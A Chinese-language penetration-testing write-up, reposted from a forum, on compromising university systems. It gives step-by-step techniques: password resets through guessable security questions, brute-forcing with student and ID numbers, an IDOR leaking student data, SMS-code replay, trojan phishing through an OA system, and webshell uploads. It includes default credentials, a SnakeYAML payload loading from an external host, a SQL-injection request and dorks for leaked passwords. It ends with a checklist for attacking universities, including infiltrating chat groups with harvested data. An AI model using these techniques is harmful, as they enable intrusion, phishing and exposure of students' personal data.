# 教育行业渗透打点


<!--more-->

> *转载自： [https://forum.butian.net/share/2423](https://forum.butian.net/share/2423)*

1、OA系统密码找回 找回密码 系统使用说明文档中发现登录账号 600030 密码找回，找回方式选择密保问题 问题选择出生地，密保问题答案填写高校所在地 即可修改密码 修改密码，即可以图文信息...

## 1、OA系统密码找回

## 找回密码

系统使用说明文档中发现登录账号 600030

![](https://qqq.gtimg.cn/music/photo_new/T053XD000004UrAaa0hDNRU.jpg)

密码找回，找回方式选择密保问题

![](https://qqq.gtimg.cn/music/photo_new/T053XD0000032mnlY3PpOhd.jpg)

问题选择出生地，密保问题答案填写高校所在地

![](https://qqq.gtimg.cn/music/photo_new/T053XD000004Nk0wu0BMZlH.jpg)

即可修改密码

![](https://qqq.gtimg.cn/music/photo_new/T053XD000004bnEDh05JXan.jpg)

修改密码，即可以图文信息中心的身份登录OA系统

![](https://qqq.gtimg.cn/music/photo_new/T053XD000002btP6H0mXX3t.jpg)

在文件中找到1400多名学生的敏感信息文件，其中存在手机号、身份证号、学号，可以组合密码本进行统一身份认证系统的爆破登录，默认密码为身份证后六位

![](https://qqq.gtimg.cn/music/photo_new/T053XD000002KXPbU1ya42t.jpg)

成功登录一部分账号

![](https://qqq.gtimg.cn/music/photo_new/T053XD000001qdUt93qwJJq.jpg)

## 登录VPN

进行内网扫描，利用MS17010拿下C段多台主机权限

![](https://qqq.gtimg.cn/music/photo_new/T053XD000001EcXz841eUJe.jpg)

## 钓鱼

利用OA系统的通讯功能，散播木马

![](https://qqq.gtimg.cn/music/photo_new/T053XD000003bmMjx1zeL4E.jpg)

获取多台机器权限

![](https://qqq.gtimg.cn/music/photo_new/T053XD000000oFuZj2LSw90.jpg)

## 2、逻辑漏洞修改密码

## GitHub密码泄漏

GitHub泄漏学号密码

![](https://qqq.gtimg.cn/music/photo_new/T053XD000003VLa3e1UjMCe.jpg)

但账号已被禁用

![](https://qqq.gtimg.cn/music/photo_new/T053XD000003pitU03MEjjt.jpg)

## 获取学号手机号

存在注册功能的网站注册用户，然后登录

![](https://qqq.gtimg.cn/music/photo_new/T053XD000003zaAW33Niuwl.jpg)

通过以下接口获得用户ID /User/GetUserListByKeyWord

![](https://qqq.gtimg.cn/music/photo_new/T053XD000002w65kV1vNBL4.jpg)

可以通过以下接口遍历用户ID，获取任意用户的姓名 手机号 邮箱等敏感信息

/User/Tip?time61&id=caec35e7-9956-4f68-98bc-e2aee73ebda5&\_=1664438691592

获取多组学号、姓名、手机号

![](https://qqq.gtimg.cn/music/photo_new/T053XD000000V8TJA3fcDkY.jpg)

## 修改密码

点击同意门户的忘记密码功能，输入上面得到的学号

![](https://qqq.gtimg.cn/music/photo_new/T053XD0000043XCYR1AAy9G.jpg)

输入手机号，点击获取验证码并抓包

![](https://qqq.gtimg.cn/music/photo_new/T053XD000004SAkz644cTqZ.jpg)

记录回包内容

```
"datas":"{\"sign\":\"407ec6dc275f4766a4525e059a60ca16\"}","code":"0","message":"获取成功"
```

随意输入验证码，点击下一步，并把上面的流量包直接返回

![](https://qqq.gtimg.cn/music/photo_new/T053XD0000036Tw9g2SwHrN.jpg)

可以看到页面跳转到了设置密码

![](https://qqq.gtimg.cn/music/photo_new/T053XD000002qBQVv280Zys.jpg)

成功更改密码

![](https://qqq.gtimg.cn/music/photo_new/T053XD000004MaD4s3SEehL.jpg)

79个应用，通过其中一个aspx站SQL注入拿到shell

![](https://qqq.gtimg.cn/music/photo_new/T053XD000000Il8nU0YXpp6.jpg)

## 3、Github泄漏账号密码

## 账号密码

1、GitHub搜索"学校域名" "password" 发现邮箱账号密码

![](https://qqq.gtimg.cn/music/photo_new/T053XD0000028qZ261GBxSD.jpg)

2、登录邮箱发现手机号身份证号

![](https://qqq.gtimg.cn/music/photo_new/T053XD000004IPhjL4HaRYU.jpg)

## 统一门户

3、手机号加邮箱密码直接登录统一门户

![](https://qqq.gtimg.cn/music/photo_new/T053XD000002IQlBP0HEQQ0.jpg)

## 泛微OA

跳转到泛微OA,文件上传GetShell

![](https://qqq.gtimg.cn/music/photo_new/T053XD0000015WYsF4TidLV.jpg)

![](https://qqq.gtimg.cn/music/photo_new/T053XD000002lu4Iv22rN6f.jpg)

## 4、向日葵密码读取

## heapdump文件泄漏

直接下载heapdump文件

![](https://qqq.gtimg.cn/music/photo_new/T053XD000003DAVUR1MVw7T.jpg)

读取到mssql账号密码

## 向日葵密码读取

成功连接mssql服务器，执行xp\_cmdshell

C:\\Program Files\\Oray\\SunLogin\\SunloginClient\\config.ini为向日葵的默认安装配置文件，直接尝试读取

![](https://qqq.gtimg.cn/music/photo_new/T053XD000003nO9MS1dJvce.jpg)

fastcode将第一位字母去除就为本机识别码，encry\_pwd为加密后的本机验证码

![](https://qqq.gtimg.cn/music/photo_new/T053XD000003xoA9N0IitE0.jpg)

可以使用GitHub解密项目[https://github.com/wafinfo/Sunflower\_get\_Password](https://github.com/wafinfo/Sunflower_get_Password)进行解密。

解密后成功连接目标主机服务器

![](https://qqq.gtimg.cn/music/photo_new/T053XD000001NJHmP2vnNhT.jpg)

## 5、若依漏洞GetShell

1、某学院首页

![](https://qqq.gtimg.cn/music/photo_new/T053XD0000023O62e4dYbMM.jpg)

2、/login ，访问后台页面，发现为若依框架，admin/admin@123直接登录后台

![](https://qqq.gtimg.cn/music/photo_new/T053XD000001Adur14Z0S9S.jpg)

## 定时任务命令执行

以管理员权限登录在定时任务处新增

org.yaml.snakeyaml.Yaml.load('!!javax.script.ScriptEngineManager \[ !!java.net.URLClassLoader \[\[ !!java.net.URL \["ftp://ceshi.bdtmos.dnslog.cn"\] \]\] \]')运行任务

![](https://qqq.gtimg.cn/music/photo_new/T053XD000002O5gli4IeWxQ.jpg)DNSlog平台收到请求

![](https://qqq.gtimg.cn/music/photo_new/T053XD0000018P2RS2wcRef.jpg)

## shiro 反序列化漏洞

工具直接开扫，成功注入内存马

![](https://qqq.gtimg.cn/music/photo_new/T053XD000002goB4z3YtaWR.jpg)

连接内存马

![](https://qqq.gtimg.cn/music/photo_new/T053XD000001ddE362VqH63.jpg)

发现历史入侵痕迹，发现fscan黑客漏扫工具

![](https://qqq.gtimg.cn/music/photo_new/T053XD000003uA4fi1y61dq.jpg)

## SQL注入

sql注入当时也懒得去尝试，估计也是存在的

/system/role/list

/system/role/export

/system/dept/edit

```
POST /system/role/list HTTP/1.1 Host: Cache-Control: max-age=0 Upgrade-Insecure-Requests: 1 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.105 Safari/537.36 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9 Sec-Fetch-Site: same-origin Sec-Fetch-Mode: navigate Sec-Fetch-User: ?1 Sec-Fetch-Dest: document Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9 Cookie: JSESSIONID=e9f143b9-3c3d-4acb-96a4-93c7367a98e9 Connection: close Content-Type: application/x-www-form-urlencoded Content-Length: 75 params[dataScope]=and extractvalue(1,concat(0x7e,(select database()),0x7e))
```

## 6、FCKeditor上传文件GetShell

1、扫描目录发现存在FCKeditor目录

![](https://qqq.gtimg.cn/music/photo_new/T053XD000004dDeHx49WZ0y.jpg)

2、直接找到上传目录

![](https://qqq.gtimg.cn/music/photo_new/T053XD000002PwF8S0QtjaR.jpg)

3、上传aspx木马

![](https://qqq.gtimg.cn/music/photo_new/T053XD000000hB3tL2n5U5E.jpg)

成功连接

![](https://qqq.gtimg.cn/music/photo_new/T053XD000002D40TA24JM2h.jpg)

## 7、任意文件上传

根据学校名称及域名进行编排密码本，爆破登录admin账号

![](https://qqq.gtimg.cn/music/photo_new/T053XD000004Vq9mj0WK2ZP.jpg)

上传点任意文件上传GetShell

![](https://qqq.gtimg.cn/music/photo_new/T053XD000001hSb4k0Ws3Px.jpg)

## 8、S2反序列化漏洞GetShell

1、目标网站存在S2框架

![](https://qqq.gtimg.cn/music/photo_new/T053XD000000tpqtJ0FWQ9c.jpg)

2、直接使用工具进行扫描，进而获取权限进行内网渗透

![](https://qqq.gtimg.cn/music/photo_new/T053XD000001YYdkU0uX2We.jpg)

## 9、逻辑漏洞

## 找回密码

1、某站点找回密码处，短信验证码直接出现在回包中

![](https://qqq.gtimg.cn/music/photo_new/T053XD000000WyfLD1DER16.jpg)

2、谷歌语法搜索 "XX大学" "手机号" filetype:xls 找到一些手机号码

![](https://qqq.gtimg.cn/music/photo_new/T053XD000001pxoMG1KBa5L.jpg)

3、找回功能-修改密码-登录系统，发现是一个学校党务的测试系统

![](https://qqq.gtimg.cn/music/photo_new/T053XD000001MUkcL0pQva0.jpg)

但其中数据是真实的，有上千份姓名、手机号、学号、身份证等信息

![](https://qqq.gtimg.cn/music/photo_new/T053XD0000000bLew2HiRZ5.jpg)

## 统一门户

使用学号加身份证后六位直接登录统一服务平台

![](https://qqq.gtimg.cn/music/photo_new/T053XD000001RUpTv1m0eXv.jpg)

## 10、geoserver弱口令

8085端口geoserver，进入登陆页面，使用默认账号密码admin/geoserver成功登录后台。

![image.png](https://qqq.gtimg.cn/music/photo_new/T053XD000001WIrVT0bpWWm.jpg)

## 获取数据库密码

登录后进入配置页面，点击查看其中的数据存储

![](https://qqq.gtimg.cn/music/photo_new/T053XD000003cPJvY1rXGwr.jpg)

F12查看网页源代码，读取PostgreSQL密码：

![](https://qqq.gtimg.cn/music/photo_new/T053XD000000sIMh90iw8d8.jpg)

## 撞库

同时发现目标ip还对外开启了mysql数据库，使用root和上文获取到的密码，成功连接上。

![](https://qqq.gtimg.cn/music/photo_new/T053XD000000Bom0G2vDAB4.jpg)

在其中一个log表中发现了账号和MD5加密的密码。

![](https://qqq.gtimg.cn/music/photo_new/T053XD0000018QDLG40WUnf.jpg)

## GetShell

8888端口后台登录页，使用数据库中获取到的账号密码成功登录后台，发现是个金碟的系统，然后使用了文件上传漏洞，成功getshell（截图和payload有点敏感，就不放了）

![](https://qqq.gtimg.cn/music/photo_new/T053XD000000v8iYs4LaRYZ.jpg)

## 总结：

对于高校的渗透可以从以下几点入手

1、VPN弱口令，GitHub泄漏是重灾区，可以搜索"学校域名" "password"

2、高校的站点一般比较老旧，aspx的站点比较多，可以多关注一下SQL注入，大多数的后台都存在SQL注入。

3、多扫下目录，有些存在各种编辑器的漏洞，但是一些漏洞可能是伪修复了，比如说ueditor的文件上传，可能只是把参数名更换了，只要找到正确的参数名就可以继续利用。

4、百度谷歌高级搜索学号文件，多收集一些账号，搜集网站的使用说明文件，其中有对密码组成进行说明，如身份证后六位等，针对一些管理员的账号进行密码的编排

5、QQ官方群有一些敏感文件，可以使用上面搜集到的信息混入其中

总结起来就是多信息收集，信息收集yyds
